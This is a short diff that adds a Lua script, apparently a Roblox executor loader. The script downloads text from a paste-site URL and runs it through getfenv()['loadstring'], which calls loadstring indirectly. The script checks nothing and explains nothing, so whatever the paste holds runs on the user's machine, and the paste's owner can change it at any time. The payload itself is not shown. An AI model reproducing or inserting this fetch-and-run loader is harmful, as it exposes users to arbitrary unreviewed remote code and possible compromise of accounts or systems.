@@ -1,0 +1,13 @@
+local url = "https://pastefy.app/PLoXR7kn/raw" 
+
+local response = request({
+    Url = url,
+    Method = "GET"
+})
+
+if response.Success then
+    local Ar = response.Body
+    getfenv()['loadstring'](Ar)()
+else
+    warn("Error?: " .. tostring(response.StatusCode))
+end
